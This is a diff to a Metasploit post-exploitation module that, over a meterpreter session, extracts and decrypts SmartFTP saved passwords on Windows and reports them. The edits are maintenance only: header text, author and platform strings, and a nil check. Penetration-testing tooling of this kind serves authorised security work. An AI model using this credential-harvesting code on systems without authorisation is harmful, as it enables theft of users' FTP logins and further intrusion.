@@ -1,13 +1,9 @@
-##
-# $Id$
-##
-
 
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 
@@ -22,14 +18,13 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super( update_info( info,
 			'Name'          => 'Windows Gather SmartFTP Saved Password Extraction',
-			'Version'       => '$Revision$',
 			'Description'   => %q{ This module finds saved login credentials
 						for the SmartFTP FTP client for windows.
 						It finds the saved passwords and decrypts
 						them.},
 			'License'       => MSF_LICENSE,
-			'Author'        => [ 'TheLightCosine <thelightcosine[at]gmail.com>'],
-			'Platform'      => [ 'windows' ],
+			'Author'        => [ 'theLightCosine'],
+			'Platform'      => [ 'win' ],
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
 	end
@@ -113,10 +108,15 @@ class Metasploit3 < Msf::Post
 			pass = decrypt(epassword)
 
 			print_good("HOST: #{host} PORT: #{port} USER: #{user} PASS: #{pass}")
+			if session.db_record
+				source_id = session.db_record.id
+			else
+				source_id = nil
+			end
 			report_auth_info(
 						:host  => host,
 						:port => port,
-						:source_id => session.db_record.id,
+						:source_id => source_id,
 						:source_type => "exploit",
 						:user => user,
 						:pass => pass
